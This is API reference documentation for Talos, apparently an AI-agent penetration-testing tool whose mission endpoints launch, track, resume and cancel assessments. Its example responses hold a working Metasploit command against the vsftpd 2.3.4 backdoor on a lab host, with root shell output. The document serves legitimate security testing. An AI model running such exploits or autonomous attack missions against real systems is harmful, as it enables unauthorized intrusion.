<a id="missions-top"></a>

<p align="left">
  <a href="./index.md">← API Reference</a> 
</p>

# Missions API
#### Base Path: `/talos/api/missions`
The Missions API endpoints manage the execution of cyber security assessment campaigns against specified targets.

These endpoints allow operators to launch penetration testing tasks using either a cloud-assisted intelligent model or a completely air-gapped environment.

## Table of Contents
- [`POST /local`](#post-local)
- [`POST /hybrid`](#post-hybrid)
- [`GET /`](#get-missions)
- [`GET /:mission_uuid`](#get-mission)
- [`GET /:mission_uuid/findings`](#get-mission-findings)
- [`POST /:mission_uuid/resume`](#post-resume-mission)
- [`POST /:mission_uuid/cancel`](#post-cancel-mission)

## POST /local
Initiates a security assessment campaign managed exclusively by the internal processing stack **LocalOrchestrator**. Engineered for strict operational isolation, ensuring that no target telemetry, prompts, or execution metadata leave the deployment host. It is optimal for highly restricted networks or strict air-gapped pentesting requirements.

### Request
- #### Body
     ```json
     {
          "target": "255.255.255.255",
          "prompt": "Identify open ports and look for vulnerable services"
     }
     ```

     | Field    | Type   | Required | Description                                                    |
     |----------|:------:|:--------:|----------------------------------------------------------------|
     | `target` | string | Yes      | The IP address, network range, or domain of the mission target |
     | `prompt` | string | Yes      | Custom instructions or context guiding the AI agent behavior   |

### Response
- **200 OK** — synchronous; returns the final structured report produced by the pipeline:
  ```json
  {
    "status": "completed",
    "target": "255.255.255.255",
    "data": {
      "executive_summary": "…",
      "findings": [],
      "rejected_findings": [],
      "recommendations": [],
      "confidence_score": 0.0
    }
  }
  ```

  | Field    | Type   | Description                                              |
  |----------|:------:|----------------------------------------------------------|
  | `status` | string | `completed`, or an error code on failure                 |
  | `target` | string | Echo of the requested target                             |
  | `data`   | object | Validated report (summary, findings, recommendations, confidence score) |

### Example
```bash
curl -s -X 'POST' 'http://localhost:8000/talos/api/missions/local' \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer ACCESS_TOKEN" \
     -d '{"target": "255.255.255.255", "prompt": "Identify open ports and look for vulnerable services"}' | jq
```

<p align="right">(<a href="#missions-top">back to top ↑</a>)</p>


## POST /hybrid
Launches an assessment mission utilizing the **HybridOrchestrator**, which combines edge intelligence with Google Gemini API integrations for a comprehensive target ricognition and validation.

### Request
- #### Body
     ```json
     {
          "target": "255.255.255.255",
          "prompt": "Identify open ports and look for vulnerable services"
     }
     ```

     | Field    | Type   | Required | Description                                                    |
     |----------|:------:|:--------:|----------------------------------------------------------------|
     | `target` | string | Yes      | The IP address, network range, or domain of the mission target |
     | `prompt` | string | Yes      | Custom instructions or context guiding the AI agent behavior   |

### Response
- **202 Accepted** — the mission is created and executes asynchronously on a background worker:
  ```json
  {
    "mission_uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
    "status": "pending"
  }
  ```

  | Field          | Type          | Description                                               |
  |----------------|:-------------:|-----------------------------------------------------------|
  | `mission_uuid` | string (uuid) | Identifier used to poll results or open the live stream   |
  | `status`       | string        | Initial mission status (`pending`)                        |

  Retrieve the full result with [`GET /{mission_uuid}`](#get-mission_uuid), or stream progress live over the WebSocket `/ws/{mission_uuid}`.

### Example
```bash
curl -s -X 'POST' 'http://localhost:8000/talos/api/missions/hybrid' \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer ACCESS_TOKEN" \
     -d '{"target": "255.255.255.255", "prompt": "Identify open ports and look for vulnerable services"}' | jq
```


<a id="get-missions"></a>

## GET /
Lists every mission owned by the authenticated user, most recent first.

### Request
_No parameters. Requires a valid access token._

### Example
```bash
curl -s 'http://localhost:8000/talos/api/missions' \
     -H "Authorization: Bearer ACCESS_TOKEN" | jq
```

### Response
- **200 OK** — a JSON array of mission records (each is the same `mission` object returned by [`GET /{mission_uuid}`](#get-mission_uuid)):
  ```json
  [
    {
      "uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
      "target": "metasploitable",
      "target_ip": "172.20.0.4",
      "prompt": "Perform a comprehensive penetration test...",
      "orchestrator_version": "v2",
      "status": "completed",
      "discovered": true,
      "error": null,
      "created_at": "2026-10-18T21:20:36Z",
      "updated_at": "2026-10-18T21:45:44Z",
      "started_at": "2026-10-18T21:20:36Z",
      "finished_at": "2026-10-18T21:45:44Z"
    }
  ]
  ```

<p align="right">(<a href="#missions-top">back to top ↑</a>)</p>



<a id="get-mission"></a>
## GET /:mission_uuid
Returns the full state of a single mission: the mission record, the discovered `ports`, the `findings` (each a durable exploitation step with its captured execution proof), the per-agent LLM usage (`models`), and the aggregated `metrics` (token totals, LLM call count, latency and wall-clock duration).

### Request
- #### Parameters
  | Parameter      | Location | Type          | Required | Description                                       |
  |----------------|:--------:|:-------------:|:--------:|---------------------------------------------------|
  | `mission_uuid` | Path     | string (uuid) | Yes      | The mission identifier returned by `POST /hybrid` |

### Example
```bash
curl -s 'http://localhost:8000/talos/api/missions/MISSION_UUID' \
     -H "Authorization: Bearer ACCESS_TOKEN" | jq
```

### Response
- **200 OK** (values illustrative of the format):
  ```json
  {
    "mission": {
      "uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
      "target": "metasploitable",
      "target_ip": "172.20.0.4",
      "orchestrator_version": "v2",
      "status": "completed",
      "discovered": true,
      "created_at": "2026-10-18T21:20:36Z",
      "finished_at": "2026-10-18T21:45:44Z"
    },
    "ports": [
      { "port": 21, "service_name": "ftp", "version": "vsftpd 2.3.4", "status": "completed", "attempts": 1 }
    ],
    "findings": [
      {
        "uuid": "eeeeeeee-eeee-4eee-aeee-eeeeeeeeeeee",
        "port": 21,
        "service_name": "ftp",
        "action": "EXECUTE_ATTACK",
        "command": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.20.0.4; set RPORT 21; run -z; sessions -c whoami; sessions -c id; sessions -c 'uname -a'; exit -y\"",
        "output": "[*] Command shell session 1 opened ...\nroot\nuid=0(root) gid=0(root) groups=0(root)",
        "reasoning": "Exploit-first known module: vsftpd 2.3.4 backdoor",
        "confirmed": true
      }
    ],
    "models": {
      "scanner": { "model": "gemini-3.1-flash-lite-preview", "provider": "gemini",
        "usage": { "prompt_tokens": 5077, "completion_tokens": 1081, "total_tokens": 6158, "call_count": 1, "total_latency_seconds": 3.337 } },
      "manager": { "model": "gemini-3.1-flash-lite-preview", "provider": "gemini",
        "usage": { "prompt_tokens": 40166, "completion_tokens": 6391, "total_tokens": 46557, "call_count": 45, "total_latency_seconds": 75.163 } }
    },
    "metrics": {
      "total_prompt_tokens": 45243,
      "total_completion_tokens": 7472,
      "total_tokens": 52715,
      "total_llm_calls": 46,
      "total_latency_seconds": 78.501,
      "duration_seconds": 1508.215,
      "duration": "00:25:08"
    }
  }
  ```

  | Field      | Type   | Description                                                        |
  |------------|:------:|--------------------------------------------------------------------|
  | `mission`  | object | Mission record (status, target, timestamps, ...)                   |
  | `ports`    | array  | Discovered services and their investigation status                 |
  | `findings` | array  | Exploitation steps; `confirmed: true` only on real execution proof |
  | `models`   | object | Per-agent LLM usage, keyed by role (`scanner`, `manager`, ...)     |
  | `metrics`  | object | Aggregated token/latency totals + wall-clock `duration`            |

  **`models.<agent>`**
  | Field                         | Type   | Description                                     |
  |-------------------------------|:------:|-------------------------------------------------|
  | `model`                       | string | Model id serving that agent                     |
  | `provider`                    | string | `gemini`, `ollama`, `openai`, `anthropic`, ...  |
  | `usage.prompt_tokens`         | int    | Input tokens consumed by the agent              |
  | `usage.completion_tokens`     | int    | Output tokens generated                         |
  | `usage.total_tokens`          | int    | Sum of prompt + completion                      |
  | `usage.call_count`            | int    | Number of LLM calls made by the agent           |
  | `usage.total_latency_seconds` | float  | Cumulative model latency for the agent          |

  **`metrics`**
  | Field                      | Type   | Description                                             |
  |----------------------------|:------:|---------------------------------------------------------|
  | `total_prompt_tokens`      | int    | Prompt tokens across all agents                         |
  | `total_completion_tokens`  | int    | Completion tokens across all agents                     |
  | `total_tokens`             | int    | Grand total of tokens                                   |
  | `total_llm_calls`          | int    | Total LLM calls in the mission                          |
  | `total_latency_seconds`    | float  | Aggregate model latency                                 |
  | `duration_seconds`         | float  | Wall-clock from `created_at` to `finished_at` (or now)  |
  | `duration`                 | string | Same duration formatted as `hh:mm:ss`                   |

#### Live stream (WebSocket)
`GET /ws/{mission_uuid}?token=<access_jwt>` streams the same data incrementally: a `snapshot` on connect, then `log` / `services` / `finding` / `port_status` / `usage` / `mission_status` events until a terminal state. Each `usage` event carries both the per-call `delta` and the running `agent_usage` + `metrics`, so a UI can render a live counter.

<p align="right">(<a href="#missions-top">back to top ↑</a>)</p>



<a id="get-mission-findings"></a>

## GET /:mission_uuid/findings
Returns the mission's findings, filterable by port/confirmed and paginated (chronological order, oldest first).

### Request
- #### Parameters
  | Parameter      | Location | Type          | Required | Description                                     |
  |----------------|:--------:|:-------------:|:--------:|-------------------------------------------------|
  | `mission_uuid` | Path     | string (uuid) | Yes      | The mission identifier                          |
  | `port`         | Query    | int           | No       | Filter by port number                           |
  | `confirmed`    | Query    | bool          | No       | Filter by the `confirmed` flag (`true`/`false`) |
  | `limit`        | Query    | int           | No       | Max findings to return (1–200, default `50`)    |
  | `offset`       | Query    | int           | No       | Findings to skip, for pagination (default `0`)  |

### Example
```bash
curl -s 'http://localhost:8000/talos/api/missions/MISSION_UUID/findings?confirmed=true&limit=50' \
     -H "Authorization: Bearer ACCESS_TOKEN" | jq
```

### Response
- **200 OK**:
  ```json
  {
    "mission_uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
    "total": 11,
    "limit": 50,
    "offset": 0,
    "count": 11,
    "findings": [
      {
        "uuid": "eeeeeeee-eeee-4eee-aeee-eeeeeeeeeeee",
        "port": 21,
        "service_name": "ftp",
        "action": "EXECUTE_ATTACK",
        "command": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; ...\"",
        "output": "...\nuid=0(root) gid=0(root) groups=0(root)",
        "reasoning": "Exploit-first known module: vsftpd 2.3.4 backdoor",
        "confirmed": true,
        "created_at": "2026-10-18T21:38:52Z"
      }
    ]
  }
  ```

  | Field          | Type   | Description                                              |
  |----------------|:------:|----------------------------------------------------------|
  | `mission_uuid` | string | The mission identifier                                   |
  | `total`        | int    | Total findings matching the filters (ignores pagination) |
  | `limit`        | int    | Page size used                                           |
  | `offset`       | int    | Number of findings skipped                               |
  | `count`        | int    | Findings returned in this page                           |
  | `findings`     | array  | Finding objects (same shape as in `GET /{mission_uuid}`) |

<p align="right">(<a href="#missions-top">back to top ↑</a>)</p>



<a id="post-resume-mission"></a>

## POST /:mission_uuid/resume
Resumes a previously stopped mission (status `failed` or `interrupted`); already-finished ports are skipped and execution continues on a background worker.

### Request
- #### Parameters
  | Parameter      | Location | Type          | Required | Description            |
  |----------------|:--------:|:-------------:|:--------:|------------------------|
  | `mission_uuid` | Path     | string (uuid) | Yes      | The mission identifier |

### Example
```bash
curl -s -X 'POST' 'http://localhost:8000/talos/api/missions/MISSION_UUID/resume' \
     -H "Authorization: Bearer ACCESS_TOKEN" | jq
```

### Response
- **202 Accepted**:
  ```json
  {
    "mission_uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
    "status": "running"
  }
  ```

  | Field          | Type          | Description                       |
  |----------------|:-------------:|-----------------------------------|
  | `mission_uuid` | string (uuid) | The mission identifier            |
  | `status`       | string        | New mission status (`running`)    |

- **409 Conflict** — the mission is not in a resumable state; only `failed` or `interrupted` missions can be resumed.

<p align="right">(<a href="#missions-top">back to top ↑</a>)</p>



<a id="post-cancel-mission"></a>

## POST /:mission_uuid/cancel
Requests cooperative cancellation of a running or pending mission. The worker stops at its next checkpoint (an in-flight command finishes first) and the mission becomes `interrupted` — which is itself resumable.

### Request
- #### Parameters
  | Parameter      | Location | Type          | Required | Description            |
  |----------------|:--------:|:-------------:|:--------:|------------------------|
  | `mission_uuid` | Path     | string (uuid) | Yes      | The mission identifier |

### Example
```bash
curl -s -X 'POST' 'http://localhost:8000/talos/api/missions/MISSION_UUID/cancel' \
     -H "Authorization: Bearer ACCESS_TOKEN" | jq
```

### Response
- **202 Accepted**:
  ```json
  {
    "mission_uuid": "ffffffff-ffff-4fff-afff-ffffffffffff",
    "status": "cancelling"
  }
  ```

  | Field          | Type          | Description                                         |
  |----------------|:-------------:|-----------------------------------------------------|
  | `mission_uuid` | string (uuid) | The mission identifier                              |
  | `status`       | string        | `cancelling` while a live worker stops at its checkpoint |

  > If no live worker is tracked in this process (e.g. a stale `running` mission after a restart), the record is marked `interrupted` directly and `status` is returned as `interrupted`.

- **409 Conflict** — only `running` or `pending` missions can be cancelled.



<div style="display: flex; justify-content: space-between; align-items: center;">
  <a href="./index.md">← API Reference</a>
  <div>
     (<a href="#missions-top">back to top ↑</a>)
  </div>
</div>